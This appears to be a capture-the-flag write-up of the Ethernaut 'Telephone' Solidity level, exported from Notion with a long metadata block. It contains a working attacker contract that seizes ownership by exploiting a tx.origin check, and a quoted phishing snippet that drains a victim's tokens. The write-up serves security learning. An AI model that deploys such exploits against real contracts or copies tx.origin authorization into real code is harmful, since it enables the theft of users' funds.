---
title: "Telephone"
date: "2024-02-11T14:32:00.000Z"
lastmod: "2024-02-12T09:30:00.000Z"
draft: false
type: "docs"
Difficulty: "⭐"
Date: "2024-02-10"
next: "fal1out-adc1e96866bc443c8f73279d9d54ddcc"
State: "Terminé"
NOTION_METADATA:
  object: "page"
  id: "b59b329c-b218-4d11-8a98-135159a4b7e3"
  created_time: "2024-02-11T14:32:00.000Z"
  last_edited_time: "2024-02-12T09:30:00.000Z"
  created_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  last_edited_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  cover: null
  icon:
    type: "external"
    external:
      url: "https://ethernaut.openzeppelin.com/imgs/BigLevel4.svg"
  parent:
    type: "database_id"
    database_id: "8eb542ce-cd0a-4616-90c5-674614439ec0"
  archived: false
  properties:
    type:
      id: "AcKd"
      type: "select"
      select:
        id: "YEpZ"
        name: "docs"
        color: "default"
    Difficulty:
      id: "IAjo"
      type: "select"
      select:
        id: "FPYQ"
        name: "⭐"
        color: "gray"
    Date:
      id: "Y%40Gy"
      type: "date"
      date:
        start: "2024-02-10"
        end: null
        time_zone: null
    next:
      id: "%5Eru%5C"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "fal1out-adc1e96866bc443c8f73279d9d54ddcc"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "fal1out-adc1e96866bc443c8f73279d9d54ddcc"
          href: null
    prev:
      id: "a%5Dip"
      type: "rich_text"
      rich_text: []
    State:
      id: "f%40ps"
      type: "status"
      status:
        id: "abb7fad3-add1-4b13-946c-06bff36598bf"
        name: "Terminé"
        color: "green"
    URL:
      id: "juZs"
      type: "url"
      url: null
    Name:
      id: "title"
      type: "title"
      title:
        - type: "text"
          text:
            content: "Telephone"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Telephone"
          href: null
  url: "https://www.notion.so/Telephone-b59b329cb2184d118a98135159a4b7e3"
  public_url: null
UPDATE_TIME: "2024-02-12T09:31:14.833Z"

---
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">


Claim ownership of the contract below to complete this level.


Things that might help

- See the ["?"](https://ethernaut.openzeppelin.com/help) page above, section "Beyond the console"

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```


This is one is pretty straight forward, here is the attacker contract we can deploy:


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone {
  function changeOwner(address _owner) external;
}

contract CoinFlipAttack {

   Telephone telephone;

  constructor(address target) {
    telephone = Telephone(target);
  }

  function attack() public {
    telephone.changeOwner(msg.sender);
  }
}
```


While this example may be simple, confusing `tx.origin` with `msg.sender` can lead to phishing-style attacks, such as [this](https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/).


An example of a possible attack is outlined below.

1. Use `tx.origin` to determine whose tokens to transfer, e.g.

```text
function transfer(address _to, uint _value) {
  tokens[tx.origin] -= _value;
  tokens[_to] += _value;
}

```

1. Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.

```text
function () payable {
  token.transfer(attackerAddress, 10000);
}

```

1. In this scenario, `tx.origin` will be the victim's address (while `msg.sender` will be the malicious contract's address), resulting in the funds being transferred from the victim to the attacker.
